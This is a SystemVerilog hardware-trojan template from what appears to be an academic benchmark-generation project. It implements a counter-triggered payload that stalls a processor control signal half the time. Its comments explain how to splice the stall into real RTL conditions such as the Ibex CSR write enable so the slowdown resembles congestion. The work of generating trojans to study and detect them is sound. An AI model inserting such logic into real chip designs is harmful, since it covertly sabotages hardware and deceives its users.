/**
 * Sequential Availability / Performance Degradation Trojan - Code Snippet
 * 
 * Trust-Hub Category: Performance Degradation ✓ (gate-level benchmarks exist)
 * Trust-Hub Benchmarks: MEMCTRL-T100, s38417-T100, s38584-T100
 * Literature Sources: Boraten & Kodi 2016 (NoC availability attacks),
 *                    Jin & Makris 2008 (performance degradation trojans),
 *                    Hoque et al. 2020 (RTL-level availability attacks)
 * 
 * Description:
 *   Inserts PERIODIC stall cycles by blocking a control signal (enable/valid)
 *   for STALL_CYCLES out of every STALL_PERIOD cycles. This is fundamentally
 *   different from DoS:
 *     DoS:          trojan_active → PERMANENT block (system halts)
 *     Availability: stall_active  → PERIODIC block (system slows down)
 *   
 *   The periodic nature makes this very hard to attribute - it resembles
 *   timing violations, arbitration contention, or bus congestion.
 *   Based on MEMCTRL-T100: inserts wait states into memory controller.
 *   
 * Trigger: Counter on in_valid_i
 * Payload: Stall busy_o periodically (50% throughput reduction)
 * 
 * NOTE: This template generates BASIC trigger logic only.
 *       The prepare_multi_trojan_simulation.py script will REPLACE
 *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [15:0] trojan_counter;
logic        trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        // Count activations - reduction OR handles multi-bit signals correctly
        if (|in_valid_i) begin
            trojan_counter <= trojan_counter + 1;
        end
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Periodic Stall Injection
// ============================================================
// stall_active pulses HIGH for STALL_CYCLES out of every STALL_PERIOD.
// Default: 8 stall cycles out of 16 = 50% throughput reduction.
// System continues working but at half speed - unlike DoS which is total failure.
// ============================================================

localparam int STALL_PERIOD = 16;  // Stall window repeats every 16 cycles
localparam int STALL_CYCLES = 8;   // Block signal for first 8 of every 16 cycles

logic [7:0] stall_counter;
logic       stall_active;          // HIGH = signal is being blocked (stalled)

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        stall_counter <= '0;
        stall_active  <= 1'b0;
    end else if (trojan_active) begin
        // Increment and wrap counter
        if (stall_counter >= STALL_PERIOD[7:0] - 1) begin
            stall_counter <= '0;
        end else begin
            stall_counter <= stall_counter + 1;
        end
        // Assert stall for first STALL_CYCLES of each period
        stall_active <= (stall_counter < STALL_CYCLES[7:0]) ? 1'b1 : 1'b0;
    end else begin
        stall_counter <= '0;
        stall_active  <= 1'b0;
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Performance Degradation: Block busy_o during stall windows.
//
// IMPORTANT: Use stall_active (periodic), NOT trojan_active (permanent).
//   Using trojan_active here would make this identical to DoS.
//
// Integration Script Must:
//   Find all conditions using busy_o, e.g.:
//     if (busy_o) begin
//     else if (busy_o) begin
//     end else if (busy_o) begin
//   Replace each with:
//     if (busy_o && !stall_active) begin
//     else if (busy_o && !stall_active) begin
//     end else if (busy_o && !stall_active) begin
//
// Manual Example (ibex_csr - stall the write enable):
//   Find:    end else if (wr_en_i) begin
//   Replace: end else if (wr_en_i && !stall_active) begin
//
// Effect: When trojan_active = 1:
//   busy_o is blocked for 8 out of every 16 cycles.
//   Throughput drops to ~50% but system never fully stops.
//   Resembles arbitration contention or cache miss storms.
//   Result: Subtle performance degradation - very hard to attribute to hardware trojan!